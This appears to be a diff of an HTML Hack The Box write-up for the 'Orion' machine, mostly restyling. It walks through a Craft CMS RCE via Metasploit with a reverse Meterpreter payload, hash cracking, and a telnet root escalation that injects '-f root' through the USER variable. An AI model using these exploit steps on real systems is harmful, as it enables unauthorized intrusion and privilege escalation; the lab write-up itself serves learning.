@@ -1,83 +1,338 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Orion &mdash; HTB Writeup</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Orion &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
 </head>
 <body>
-    <main class="main-content">
-        <div class="content-card">
-<div class="writeup-content">
-    <div style="text-align: center;">
-        <h1>Hack The Box</h1>
-        <h2>Orion</h2>
-        <img src="/pngs/HTB/Easy/Orion/Orion.png" alt="Orion Banner" style="border:none; width: 300px; margin-bottom: 20px;">
-        <h3 style="color: #3fb950;">Level: Easy</h3>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Orion/Orion.png" alt="Orion machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Orion</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
     </div>
+  </div>
+</header>
 
-    <p>Summary of the attack path:</p>
-    <ul>
-        <li><strong>Craft CMS 5.6.16</strong> &mdash; <strong>CVE-2025-32432</strong>.</li>
-        <li>Cracking hashed credentials obtained from the database with <strong>hashcat</strong>.</li>
-        <li>Vulnerable running service &mdash; <strong>Telnet 2.7</strong>, <strong>CVE-2026-24061</strong>.</li>
-    </ul>
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">1. Enumeration</a></li>
+    <li><a href="#foothold">2. Foothold</a></li>
+    <li><a href="#privilege-escalation">3. Privilege Escalation</a></li>
+  </ul>
+</nav>
 
-    <h3 class="step-header">1. Enumeration</h3>
-    <p>We start with port enumeration.</p>
-    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.64.239</div>
+<h2 id="summary">Summary</h2>
+<p>Summary of the attack path:</p>
+<ul>
+  <li><strong>Craft CMS 5.6.16</strong> &mdash; <strong>CVE-2025-32432</strong>.</li>
+  <li>Cracking hashed credentials obtained from the database with <strong>hashcat</strong>.</li>
+  <li>Vulnerable running service &mdash; <strong>Telnet 2.7</strong>, <strong>CVE-2026-24061</strong>.</li>
+</ul>
 
-    <p>We find ports <code>22</code> and <code>80</code> open.</p>
+<h2 id="enumeration">1. Enumeration</h2>
+<p>We start with port enumeration.</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.64.239</div>
+<p>We find ports <code>22</code> and <code>80</code> open.</p>
 
-    <p>Using <code>ffuf</code>, we find the <code>admin</code> directory:</p>
-    <div class="terminal-box">ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://orion.htb/FUZZ</div>
+<p>Using <code>ffuf</code>, we find the <code>admin</code> directory:</p>
+<div class="terminal-box">ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://orion.htb/FUZZ</div>
 
-    <p>The site runs <code>Craft CMS 5.6.16</code>.</p>
+<p>The site runs <code>Craft CMS 5.6.16</code>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Orion/craftcms-version.png" alt="Craft CMS 5.6.16 version shown on the admin login page" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Orion/craftcms-version.png" alt="Craft CMS 5.6.16 version shown on the admin login page" loading="lazy">
-
-    <h3 class="step-header">2. Foothold</h3>
-    <p>Reference PoC: <a href="https://github.com/CTY-Research-1/CVE-2025-32432-PoC">CVE-2025-32432-PoC</a></p>
-    <p>Opening Metasploit, we find a module that gives us <code>RCE</code>.</p>
-    <div class="terminal-box">msfconsole -q
+<h2 id="foothold">2. Foothold</h2>
+<p>Reference PoC: <a href="https://github.com/CTY-Research-1/CVE-2025-32432-PoC">CVE-2025-32432-PoC</a></p>
+<p>Opening Metasploit, we find a module that gives us <code>RCE</code>.</p>
+<div class="terminal-box">msfconsole -q
 msf &gt; search Craftcms
 msf &gt; use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
 msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) &gt; options
 ...</div>
 
-    <p>Make sure you have set the proper payload:</p>
-    <div class="terminal-box">msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) &gt; set payload php/meterpreter/reverse_http</div>
+<p>Make sure you have set the proper payload:</p>
+<div class="terminal-box">msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) &gt; set payload php/meterpreter/reverse_http</div>
 
-    <p>We get a Meterpreter session.</p>
-    <div class="terminal-box">meterpreter &gt;</div>
+<p>We get a Meterpreter session.</p>
+<div class="terminal-box">meterpreter &gt;</div>
 
-    <p>In <code>/etc/passwd</code> we find two users:</p>
-    <ul>
-        <li><code>root</code></li>
-        <li><code>adam</code></li>
-    </ul>
+<p>In <code>/etc/passwd</code> we find two users:</p>
+<ul>
+  <li><span class="user">root</span></li>
+  <li><span class="user">adam</span></li>
+</ul>
 
-    <p>By reading the environment at <code>/var/www/html/craft/.env</code>, we find a password:</p>
-    <div class="terminal-box">SuperSecureCraft123Pass!</div>
+<p>By reading the environment at <code>/var/www/html/craft/.env</code>, we find a password:</p>
+<div class="terminal-box">SuperSecureCraft123Pass!</div>
 
-    <p>These credentials log us in to the database.</p>
+<p>These credentials log us in to the database.</p>
 
-    <p>Back then when I solved it, I connected by the easy way:</p>
-    <div class="terminal-box">meterpreter &gt; shell
+<p>Back then when I solved it, I connected the easy way:</p>
+<div class="terminal-box">meterpreter &gt; shell
 
-python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</div>
-    <div class="terminal-box">mysql -u root -p
+python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+<div class="terminal-box">mysql -u root -p
 Enter password: SuperSecureCraft123Pass!</div>
-
-    <img src="/pngs/HTB/Easy/Orion/mysql-login.png" alt="Logging in to MariaDB as root using the recovered password" loading="lazy">
-
-    <div class="terminal-box">MariaDB [(none)]&gt; show databases;
+<figure>
+  <img src="/pngs/HTB/Easy/Orion/mysql-login.png" alt="Logging in to MariaDB as root using the recovered password" loading="lazy">
+</figure>
+<div class="terminal-box">MariaDB [(none)]&gt; show databases;
 MariaDB [(none)]&gt; use orion;
 MariaDB [orion]&gt; select * from users;</div>
 
-    <p>But when I tried to solve it again, I could not get an interactive shell besides the Meterpreter. So I had to use a different way.</p>
-    <div class="terminal-box">meterpreter &gt; execute -H -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SHOW TABLES;'" -c
+<p>But when I tried to solve it again, I could not get an interactive shell besides the Meterpreter. So I had to use a different way.</p>
+<div class="terminal-box">meterpreter &gt; execute -H -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SHOW TABLES;'" -c
 
 Process 1828 created.
 Channel 6 created.
@@ -106,53 +361,52 @@ Read 111 bytes from 7:
 id	username	email	password
 1	admin	adam@orion.htb	$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</div>
 
-    <p>Here we find a hash for the user <code>adam</code>, with the email <code>adam@orion.htb</code>:</p>
-    <div class="terminal-box">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</div>
+<p>Here we find a hash for the user <span class="user">adam</span>, with the email <code>adam@orion.htb</code>:</p>
+<div class="terminal-box">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</div>
 
-    <p>We crack it with hashcat:</p>
-    <div class="terminal-box">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</div>
+<p>We crack it with hashcat:</p>
+<div class="terminal-box">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</div>
 
-    <fieldset class="cred-box">
-        <legend>Credentials</legend>
-        <code>adam : darkangel</code>
-    </fieldset>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">adam</span> : <span class="pass">darkangel</span></code>
+</fieldset>
 
-    <fieldset class="root-box">
-        <legend>User Flag</legend>
-        <code>[REDACTED]</code>
-    </fieldset>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <h3 class="step-header">3. Privilege Escalation</h3>
-    <p><strong>Root</strong></p>
-    <p>After logging in as <code>adam</code>, we check the running services with this command:</p>
-    <div class="terminal-box">ss -tulpn</div>
+<h2 id="privilege-escalation">3. Privilege Escalation</h2>
+<p><strong>Root</strong></p>
+<p>After logging in as <span class="user">adam</span>, we check the running services with this command:</p>
+<div class="terminal-box">ss -tulpn</div>
+<figure>
+  <img src="/pngs/HTB/Easy/Orion/ss-tulpn.png" alt="Output of ss -tulpn showing a service listening on 127.0.0.1:23" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Orion/ss-tulpn.png" alt="Output of ss -tulpn showing a service listening on 127.0.0.1:23" loading="lazy">
-
-    <p>We see a service running on port <code>23</code>, which is normally used for Telnet.</p>
-    <div class="terminal-box">telnet -V
+<p>We see a service running on port <code>23</code>, which is normally used for Telnet.</p>
+<div class="terminal-box">telnet -V
 telnet (GNU inetutils) 2.7</div>
 
-    <p>This version is vulnerable to a local privilege escalation, <a href="https://github.com/0p5cur/CVE-2026-24061-POC/tree/main">CVE-2026-24061</a>.</p>
+<p>This version is vulnerable to a local privilege escalation, <a href="https://github.com/0p5cur/CVE-2026-24061-POC/tree/main">CVE-2026-24061</a>.</p>
 
-    <p>Running the script gives us root privileges.</p>
-    <fieldset class="root-box">
-        <legend>Root Flag</legend>
-        <code>[REDACTED]</code>
-    </fieldset>
+<p>Running the script gives us root privileges.</p>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <p>An easier way is to use this command:</p>
-    <div class="terminal-box">USER=&quot;-f root&quot; telnet -a 127.0.0.1 23</div>
+<p>An easier way is to use this command:</p>
+<div class="terminal-box">USER="-f root" telnet -a 127.0.0.1 23</div>
+<ul>
+  <li><strong>USER="-f root"</strong>: The server takes the user-supplied <code>USER</code> environment variable and passes it, without checking it, into the system's <code>/usr/bin/login</code> command line. It then runs <code>login -f root</code>. The <code>-f</code> flag tells the system to skip the password check and log the user in right away.</li>
+  <li><strong>-a, --login</strong>: Attempt automatic login.</li>
+</ul>
+<p>So we tell the system to use the <code>root</code> user, skip the password check, and attempt automatic login.</p>
 
-    <ul>
-        <li><strong>USER="-f root"</strong>: The server takes the user-supplied <code>USER</code> environment variable and passes it, without checking it, into the system's <code>/usr/bin/login</code> command line. It then runs <code>login -f root</code>. The <code>-f</code> flag tells the system to skip the password check and log the user in right away.</li>
-        <li><strong>-a, --login</strong>: Attempt automatic login.</li>
-    </ul>
-    <p>So we tell the system to use the <code>root</code> user, skip the password check, and attempt automatic login.</p>
 </div>
-        </div>
-    </main>
-    <script src="/copy.js"></script>
-    <script src="/nav.js"></script>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
 </body>
 </html>
